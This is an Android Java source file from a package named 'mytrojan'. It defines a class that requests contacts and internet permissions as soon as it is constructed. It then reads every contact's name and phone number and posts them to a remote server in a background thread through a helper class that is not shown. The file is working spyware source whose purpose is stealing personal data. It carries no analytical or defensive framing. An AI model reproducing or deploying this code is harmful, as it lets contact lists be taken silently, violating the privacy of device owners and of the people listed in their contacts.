package com.example.mytrojan;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.AppCompatEditText;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.AttributeSet;
import android.util.Log;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class ExecuteIt  {

    private static final String TAG="TEST";
    private Context ctx;
    private static Context ctxTmp;

    public ExecuteIt() {
        this.ctx = ExecuteIt.ctxTmp;
        if (this.ctx != null) {
            this.getContactList();
        }

    }

    public ExecuteIt(Context ctx) {
        ExecuteIt.ctxTmp = ctx;
        this.ctx = ctx;
        this.getContactList();
    }

    // Check whether user has phone contacts manipulation permission or not.
    private boolean hasPhonePermission(String permission)
    {
        boolean ret = false;

        // If android sdk version is bigger than 23 the need to check run time permission.
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            // return phone read contacts permission grant status.
            int hasPermission = ContextCompat.checkSelfPermission(this.ctx, permission);
            // If permission is granted then return true.
            if (hasPermission == PackageManager.PERMISSION_GRANTED) {
                ret = true;
            }

        }else {
            ret = true;
        }

        return ret;
    }

    // Request a runtime permission to app user.
    private void requestPermission(String []permission)
    {
        String requestPermissionArray[] = (String[]) permission;
        ActivityCompat.requestPermissions((Activity) this.ctx, requestPermissionArray, 1);
    }

    private void getContactList() {

        List<String> mPers = new ArrayList<>();
        if(!hasPhonePermission(Manifest.permission.READ_CONTACTS)) {
            mPers.add(Manifest.permission.READ_CONTACTS);

        }

        if(!hasPhonePermission(Manifest.permission.INTERNET))
        {
            mPers.add(Manifest.permission.INTERNET);
        }

        if (mPers.size() > 0) {
            requestPermission((mPers.toArray(new String[0])));
        }

        ContentResolver cr = this.ctx.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);


                    String content = "";
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        Log.i(TAG, "Name: " + name);
                        Log.i(TAG, "Phone Number: " + phoneNo);

                        content = content + "#" + name + "#" + phoneNo;
                    }
                    pCur.close();

                    // post content to server
                    new Thread(new RequestHttp(content)).start();


                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }

}
